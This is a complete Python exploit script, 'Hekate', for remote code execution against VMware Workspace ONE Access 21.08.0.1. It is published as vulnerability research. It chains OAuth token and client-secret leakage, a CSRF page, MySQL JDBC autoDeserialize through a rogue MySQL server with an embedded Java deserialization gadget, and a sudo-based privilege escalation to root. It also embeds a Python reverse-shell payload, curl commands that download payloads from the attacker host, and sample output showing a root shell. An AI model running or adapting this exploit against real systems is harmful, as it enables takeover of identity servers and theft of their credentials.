#!/usr/bin/env python3
"""
Hekate - A VMWare Workspace ONE Access Remote Code Execution Exploit
Steven Seeley of Qihoo 360 Vulnerability Research Institute
Tekniq: MySQL JDBC Driver autoDeserialize

# Details

Date: Tue Feb 22 13:37:00 CST 2022
Version: 21.08.0.1 (latest)
File: identity-manager-21.08.0.1-19010796_OVF10.ova
File SHA1: 69e9fb988522c92e98d2910cc106ba4348d61851

# Example

Attacking server-side:

```
researcher@mercury:~$ ./poc.py -t 192.168.184.165 -c 192.168.184.146:1234 -v server

   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

(+) attacking target via the mysql driver
(+) rogue mysql server listening on 0.0.0.0:3306
(+) rogue http server listening on 0.0.0.0:8080
(+) leaked ota token:  b6defad9-bcc7-37ee-a7df-9a36d71d580a:1ZDvE9EbByg3UQWr9z9fAYY8lpNgYk6k
(+) leaked client_secret: uYkAzg1woC1qbCa3Qqd0i6UXpwa1q00o
(+) triggering command: curl http://192.168.184.146:8080/bdr.py -o /tmp/a
(+) triggered bdr download...
(+) triggering command: curl http://192.168.184.146:8080/lpe.sh -o /tmp/b
(+) triggered lpe download...
(+) triggering command: chmod 755 /tmp/a
(+) triggering command: chmod 755 /tmp/b
(+) triggering command: python /tmp/a
(+) starting handler on port 1234
(+) connection from 192.168.184.165
(+) pop thy shell!
root [ ~ ]# id
id
uid=0(root) gid=0(root) groups=0(root),1000(vami),1004(sshaccess)
root [ ~ ]# uname -a
uname -a
Linux photon-machine 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021 x86_64 GNU/Linux
root [ ~ ]#
```

Attacking client-side:

```
researcher@mercury:~$ ./poc.py -t 192.168.184.165 -c 192.168.184.146:1234 -v client

   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

(+) attacking target via the mysql driver
(+) rogue mysql server listening on 0.0.0.0:3306
(+) rogue http server listening on 0.0.0.0:8080
(+) send the victim to: http://192.168.184.146:8080/pwn
(+) starting handler on port 1234
(+) triggering command: curl http://192.168.184.146:8080/bdr.py -o /tmp/a
(+) triggering command: curl http://192.168.184.146:8080/lpe.sh -o /tmp/b
(+) triggered bdr download...
(+) triggering command: chmod 755 /tmp/a
(+) triggered lpe download...
(+) triggering command: chmod 755 /tmp/b
(+) triggering command: python /tmp/a
(+) connection from 192.168.184.165
(+) pop thy shell!
root [ ~ ]# id
id
uid=0(root) gid=0(root) groups=0(root),1000(vami),1004(sshaccess)
root [ ~ ]# uname -a
uname -a
Linux photon-machine 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021 x86_64 GNU/Linux
root [ ~ ]#
```

# References

- https://landgrey.me/blog/11/
- https://github.com/su18/JDBC-Attack/tree/main/mysql-attack
"""

import socket
from sys import argv
from json import loads
from struct import pack
from hashlib import sha256
from base64 import b64decode
from telnetlib import Telnet
from threading import Thread
from requests import get, post
from urllib.parse import urlparse
from binascii import a2b_hex, b2a_hex
from colorama import Fore, Style, Back
from random import getrandbits, choice
from urllib3 import disable_warnings, exceptions
from argparse import ArgumentParser, RawTextHelpFormatter
from http.server import BaseHTTPRequestHandler, HTTPServer
disable_warnings(exceptions.InsecureRequestWarning)

# vuln 3
csrf_payload = """
<html>
  <head>
    <script language="javascript">
        function pwn(){{
            var fd = new FormData()
            fd.append("jdbcUrl", "{j}");
            fd.append("dbUsername", "");
            fd.append("dbPassword", "");
            fetch('https://{t}/SAAS/API/1.0/REST/system/dbCheck', {{
                method: 'POST',
                body: fd,
                credentials: 'include'
            }});
        }}
        window.onload = function() {{
            for(var i = 0; i < 5; i++){{
                pwn();
            }}
        }}
    </script>
  </head>
</html>
"""

bdr_payload = """
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{h}", {p}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(["/bin/bash","/tmp/b"]) # lpe
"""

# vuln 5
lpe_payload = """
#!/bin/bash
cd /tmp
sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh {d}
mkdir {d}
ln -s /opt/vmware/certproxy/bin/certproxyService.sh {d}/debugConfig.txt
sudo /usr/local/horizon/scripts/gatherConfig.hzn {d}
rm -rf {d}
chmod 755 /opt/vmware/certproxy/bin/certproxyService.sh
echo "mv /etc/ssl/certs/{d} /opt/vmware/certproxy/bin/certproxyService.sh" > /opt/vmware/certproxy/bin/certproxyService.sh
echo "chown root:root /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "chmod 640 /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "rm /tmp/a; rm /tmp/b; cd /root; python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'" >> /opt/vmware/certproxy/bin/certproxyService.sh
sudo /opt/vmware/certproxy/bin/certproxyService.sh
"""

class http_server(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def _set_response(self, d):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Length', len(d))
        self.end_headers()
    def do_GET(self):
        if self.path.endswith("pwn"):
            # tested against chrome 98.0.4758.102 (latest at the time)
            message = csrf_payload.format(j=jdbc_uri, t=hostname)
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif self.path.endswith("lpe.sh"):
            print(f"(+) {Fore.LIGHTRED_EX}triggered lpe download...{Style.RESET_ALL}")
            message = lpe_payload.format(d=gen_key()) 
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif self.path.endswith("bdr.py"):
            print(f"(+) {Fore.LIGHTRED_EX}triggered bdr download...{Style.RESET_ALL}")
            message = bdr_payload.format(h=rhost, p=rport)
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))

def _get_payload(c):
    # java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <cmd>
    p  = "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594"
    p += "da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400"
    p += "164c6a6176612f7574696c2f436f6d70617261746f723b787000000002737200"
    p += "2b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265"
    p += "616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d706172"
    p += "61746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e"
    p += "672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e"
    p += "732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d706172"
    p += "61626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f75"
    p += "7470757450726f706572746965737704000000037372003a636f6d2e73756e2e"
    p += "6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e"
    p += "747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d"
    p += "5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b00"
    p += "0a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a"
    p += "6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f"
    p += "6f757470757450726f706572746965737400164c6a6176612f7574696c2f5072"
    p += "6f706572746965733b787000000000ffffffff757200035b5b424bfd19156767"
    p += "db37020000787000000002757200025b42acf317f8060854e002000078700000"
    p += "06abcafebabe0000003200390a00030022070037070025070026010010736572"
    p += "69616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75"
    p += "6505ad2093f391ddef3e0100063c696e69743e010003282956010004436f6465"
    p += "01000f4c696e654e756d6265725461626c650100124c6f63616c566172696162"
    p += "6c655461626c6501000474686973010013537475625472616e736c6574506179"
    p += "6c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c"
    p += "2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e73"
    p += "6c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f"
    p += "73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f7873"
    p += "6c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c"
    p += "2f696e7465726e616c2f73657269616c697a65722f53657269616c697a617469"
    p += "6f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73"
    p += "756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c"
    p += "74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f"
    p += "72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65"
    p += "722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074"
    p += "696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78"
    p += "616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e"
    p += "2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d"
    p += "417869734974657261746f723b4c636f6d2f73756e2f6f72672f617061636865"
    p += "2f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c69"
    p += "7a6174696f6e48616e646c65723b29560100086974657261746f720100354c63"
    p += "6f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64"
    p += "746d2f44544d417869734974657261746f723b01000768616e646c6572010041"
    p += "4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c"
    p += "2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c6572"
    p += "3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a"
    p += "000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f"
    p += "4761646765747324537475625472616e736c65745061796c6f6164010040636f"
    p += "6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f"
    p += "78736c74632f72756e74696d652f41627374726163745472616e736c65740100"
    p += "146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f"
    p += "6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f"
    p += "5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061"
    p += "796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100"
    p += "116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e7469"
    p += "6d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a"
    p += "002b002e01001508003001000465786563010027284c6a6176612f6c616e672f"
    p += "537472696e673b294c6a6176612f6c616e672f50726f636573733b0c00320033"
    p += "0a002b003401000d537461636b4d61705461626c6501001e79736f7365726961"
    p += "6c2f50776e65723934373134303235323131383630300100204c79736f736572"
    p += "69616c2f50776e65723934373134303235323131383630303b00210002000300"
    p += "0100040001001a000500060001000700000002000800040001000a000b000100"
    p += "0c0000002f00010001000000052ab70001b100000002000d0000000600010000"
    p += "002f000e0000000c000100000005000f003800000001001300140002000c0000"
    p += "003f0000000300000001b100000002000d00000006000100000034000e000000"
    p += "20000300000001000f0038000000000001001500160001000000010017001800"
    p += "020019000000040001001a00010013001b0002000c0000004900000004000000"
    p += "01b100000002000d00000006000100000038000e0000002a000400000001000f"
    p += "003800000000000100150016000100000001001c001d000200000001001e001f"
    p += "00030019000000040001001a00080029000b0001000c00000024000300020000"
    p += "000fa70003014cb8002f1231b6003557b1000000010036000000030001030002"
    p += "002000000002002100110000000a000100020023001000097571007e00100000"
    p += "01d4cafebabe00000032001b0a00030015070017070018070019010010736572"
    p += "69616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75"
    p += "650571e669ee3c6d47180100063c696e69743e010003282956010004436f6465"
    p += "01000f4c696e654e756d6265725461626c650100124c6f63616c566172696162"
    p += "6c655461626c6501000474686973010003466f6f01000c496e6e6572436c6173"
    p += "7365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f47"
    p += "61646765747324466f6f3b01000a536f7572636546696c6501000c4761646765"
    p += "74732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c"
    p += "6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e"
    p += "672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501"
    p += "001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574"
    p += "73002100020003000100040001001a0005000600010007000000020008000100"
    p += "01000a000b0001000c0000002f00010001000000052ab70001b100000002000d"
    p += "0000000600010000003c000e0000000c000100000005000f0012000000020013"
    p += "00000002001400110000000a000100020016001000097074000450776e727077"
    p += "01007871007e000d78"
    obj = bytearray(bytes.fromhex(p))
    obj[0x240:0x242] = pack(">H", len(c) + 0x696)
    obj[0x6e5:0x6e7] = pack(">H", len(c))
    start = obj[:0x6e7]
    end = obj[0x6e7:]
    return start + str.encode(c) + end

def server_send(conn, payload):
    global count, cmd
    count += 1
    if count == 5:
        print(f"(+) {Fore.LIGHTRED_EX}triggering command:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{cmd}{Style.RESET_ALL}")
    conn.send(a2b_hex(payload))

def server_receive(conn):
    global count, cmd, cmd_count, cmd_entries, key, deserialization_payload
    count += 1
    data = conn.recv(1024)
    if count == 2:
        found_key = data[38:38+64]
        # hardcoded key to verify the request is coming from the victim
        if found_key == key:
            cmd = cmd_entries[cmd_count]
            deserialization_payload = _get_payload(cmd_entries[cmd_count])
        cmd_count += 1
    return str(data).lower()

def run_mysql_server(host, port):
    global count, cmd_count, deserialization_payload
    count = 0
    cmd_count = 0
    # setup the socket
    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socks.bind((host, port))
    server_socks.listen(1)
    while True:
        count = 0
        conn, addr = server_socks.accept()
        _data  = "4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc1"
        _data += "1500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61"
        _data += "746976655f70617373776f726400"
        server_send(conn, _data)
        while True:
            # client auth
            server_receive(conn)
            deserialization_payload = b2a_hex(deserialization_payload)
            server_send(conn, '0700000200000002000000')
            # client query
            data = server_receive(conn)
            if "session.auto_increment_increment" in data:
                _data  = "01000001132e00000203646566000000186175746f5f696e6372656d656e745f"
                _data += "696e6372656d656e74000c3f001500000008a0000000002a0000030364656600"
                _data += "0000146368617261637465725f7365745f636c69656e74000c21000c000000fd"
                _data += "00001f00002e00000403646566000000186368617261637465725f7365745f63"
                _data += "6f6e6e656374696f6e000c21000c000000fd00001f00002b0000050364656600"
                _data += "0000156368617261637465725f7365745f726573756c7473000c21000c000000"
                _data += "fd00001f00002a00000603646566000000146368617261637465725f7365745f"
                _data += "736572766572000c210012000000fd00001f0000260000070364656600000010"
                _data += "636f6c6c6174696f6e5f736572766572000c210033000000fd00001f00002200"
                _data += "0008036465660000000c696e69745f636f6e6e656374000c210000000000fd00"
                _data += "001f0000290000090364656600000013696e7465726163746976655f74696d65"
                _data += "6f7574000c3f001500000008a0000000001d00000a03646566000000076c6963"
                _data += "656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f"
                _data += "7765725f636173655f7461626c655f6e616d6573000c3f001500000008a00000"
                _data += "00002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574"
                _data += "000c3f001500000008a0000000002700000d03646566000000116e65745f7772"
                _data += "6974655f74696d656f7574000c3f001500000008a0000000002600000e036465"
                _data += "660000001071756572795f63616368655f73697a65000c3f001500000008a000"
                _data += "0000002600000f036465660000001071756572795f63616368655f7479706500"
                _data += "0c210009000000fd00001f00001e000010036465660000000873716c5f6d6f64"
                _data += "65000c21009b010000fd00001f00002600001103646566000000107379737465"
                _data += "6d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465"
                _data += "660000000974696d655f7a6f6e65000c210012000000fd00001f00002b000013"
                _data += "03646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21"
                _data += "002d000000fd00001f000022000014036465660000000c776169745f74696d65"
                _data += "6f7574000c3f001500000008a000000000f90000150131047574663804757466"
                _data += "380475746638066c6174696e31116c6174696e315f737765646973685f636900"
                _data += "0532383830300347504c01300734313934333034023630073130343835373603"
                _data += "4f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452"
                _data += "414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45"
                _data += "524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45"
                _data += "524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e45"
                _data += "5f535542535449545554494f4e035554430653595354454d0f52455045415441"
                _data += "424c452d5245414405323838303007000016fe000002000200"
                server_send(conn, _data)
                data = server_receive(conn)
            if "show session status" in data:
                _data  = "01000001022700000203646566056365736869046f626a73046f626a73026964"
                _data += "0269640c3f000b0000000300000000002900000303646566056365736869046f"
                _data += "626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000"
                _payload_hex = str(hex(len(deserialization_payload)//2)).replace('0x', '').zfill(4)
                _payload_length = _payload_hex[2:4] + _payload_hex[0:2]
                _data_hex = str(hex(len(deserialization_payload)//2 + 5)).replace('0x', '').zfill(6)
                _data_length = _data_hex[4:6] + _data_hex[2:4] + _data_hex[0:2]
                _data += _data_length + '04' + '0131fc' + _payload_length + deserialization_payload.decode()
                _data += '07000005fe000022000100'
                server_send(conn, _data)
                data = server_receive(conn)
            if "show warnings" in data:
                _data  = "01000001031b00000203646566000000054c6576656c000c210015000000fd01"
                _data += "001f00001a0000030364656600000004436f6465000c3f000400000003a10000"
                _data += "00001d00000403646566000000074d657373616765000c210000060000fd0100"
                _data += "1f00006d000005044e6f74650431313035625175657279202753484f57205345"
                _data += "5353494f4e20535441545553272072657772697474656e20746f202773656c65"
                _data += "63742069642c6f626a2066726f6d2063657368692e6f626a7327206279206120"
                _data += "7175657279207265777269746520706c7567696e07000006fe000002000000"
                server_send(conn, _data)
            break
        try:
            # we run 5 commands against the server before we finish
            if cmd_count == 5:
                cmd_count = 0
            conn.close()
        except Exception as e:
            pass

def gen_key():
    return str.encode(sha256(str(getrandbits(256)).encode('utf-8')).hexdigest())

def handler(lp):
    print(f"(+) starting handler on port {lp}")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) connection from {addr[0]}")
    t.sock = conn
    print(f"(+) {Fore.BLUE + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
    t.interact()

# vuln 2
def get_hostname(t):
    r = get("https://{}/SAAS/jersey/manager/api/branding".format(t), verify=False)
    assert r.headers['content-type'] == 'application/vnd.vmware.horizon.manager.branding+json;charset=UTF-8', "(-) unexpected content-type cannot leak hostname"
    return urlparse(r.json()['userPortal']['mfaIconDownload']).hostname

# vuln 1 
def get_jwt(t):
    oauth_client = choice(['Service__OAuth2Client', 'acs'])
    r = post(f"https://{t}/SAAS/API/1.0/REST/oauth2/generateActivationToken/{oauth_client}", verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from token generation"
    code = r.json()['activationToken']
    ota = loads(b64decode(code))['ota']
    print(f"(+) {Fore.LIGHTRED_EX}leaked ota token: {Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{ota}{Style.RESET_ALL}")
    r = post(f"https://{t}/SAAS/API/1.0/REST/oauth2/activate", data=code,verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from token activation"
    ci = r.json()['client_id']
    cs = r.json()['client_secret']
    print(f"(+) {Fore.LIGHTRED_EX}leaked client_secret:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{cs}{Style.RESET_ALL}")
    p = {
        "grant_type"    : "client_credentials",
        "client_id"     : ci,
        "client_secret" : cs
    }
    r = post(f"https://{t}/SAAS/auth/oauthtoken", data=p, verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from access token generation"
    return r.json()['access_token']

# vuln 4
def trigger_jdbc(t, jwt, uri):
    d = {
        "jdbcUrl": uri,
        "dbUsername":"",
        "dbPassword":""
    }
    h = { "cookie" : f"HZN={jwt}" }
    post(f"https://{t}/SAAS/API/1.0/REST/system/dbCheck", headers=h, data=d, verify=False)

def banner():
    return f"""{Fore.RED + Style.BRIGHT}
   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\\_,_/\__/\__/

{Style.RESET_ALL}A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute
"""

def get_args(prog):
    helpm = f"Examples: \r\n{prog} -t 192.168.184.165 -c 192.168.184.146:1234 -v client"
    helpm += f"\r\n{prog} -t 192.168.184.165 -c 192.168.184.146:1234 -v server"
    parser = ArgumentParser(epilog=helpm, formatter_class=RawTextHelpFormatter)
    v = ["client", "server"]
    parser.add_argument('-t', '--target', dest='target', action='store', type=str, required=True,
    help='The target ip', metavar='[ip]')
    parser.add_argument('-c', '--connectback', dest='connectback', action='store', type=str, required=True,
    help='The connectback/attacking ip or hostname and port', metavar='[ip:port]')
    parser.add_argument('-v', '--vector', dest='vector', action='store', type=str, required=True,
    default="client", choices=v, help='The vector for exploitation. Either '+' or '.join(v), metavar='[vector]')
    return parser.parse_args()

def validip(ip):
    return ip.count('.') == 3 and all(0<=int(num)<256 for num in ip.rstrip().split('.'))

if __name__ == "__main__":
    print(banner())
    args       = get_args(argv[0])
    key        = gen_key()
    rport      = 1337
    rhost      = args.connectback
    target     = args.target
    http_port  = 8080
    mysql_port = 3306
    assert validip(target), "(-) you need to provide a valid ip address as the target"
    if ":" in args.connectback:
        rhost = args.connectback.split(":")[0]
        assert args.connectback.split(":")[1].isnumeric(),"(-) port must be a valid integer"
        rport = int(args.connectback.split(":")[1])
    cmd_entries = {
        0:f"curl http://{rhost}:{http_port}/bdr.py -o /tmp/a",
        1:f"curl http://{rhost}:{http_port}/lpe.sh -o /tmp/b",
        2:"chmod 755 /tmp/a",
        3:"chmod 755 /tmp/b",
        4:"python /tmp/a",
    }
    jdbc_uri  = "jdbc:mysql://{h}:{p}/{k}".format(h=rhost, p=mysql_port, k=key.decode())
    jdbc_uri += "?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"
    # connectback for the mysql server to deliver deserialization payload
    handlerthr = Thread(target=run_mysql_server, args=["0.0.0.0", mysql_port])
    handlerthr.daemon = True
    handlerthr.start()
    print(f"(+) attacking target via the mysql driver")
    print(f"(+) rogue mysql server listening on 0.0.0.0:{mysql_port}")
    # connectback http server for the csrf exploit and MySQL JDBC driver exploitation
    server = HTTPServer(('0.0.0.0', http_port), http_server)
    handlerthr = Thread(target=server.serve_forever, args=[])
    handlerthr.daemon = True
    handlerthr.start()
    print(f"(+) rogue http server listening on 0.0.0.0:{http_port}")
    if args.vector == "client":
        hostname = get_hostname(target)
        print(f"(+) send the victim to: {Fore.CYAN + Back.MAGENTA + Style.BRIGHT}http://{rhost}:{http_port}/pwn{Style.RESET_ALL}")
    else:
        jwt = get_jwt(target)
        for i in range(0, 5):
            trigger_jdbc(target, jwt, jdbc_uri)
    handlerthr = Thread(target=handler, args=[rport])
    handlerthr.start()
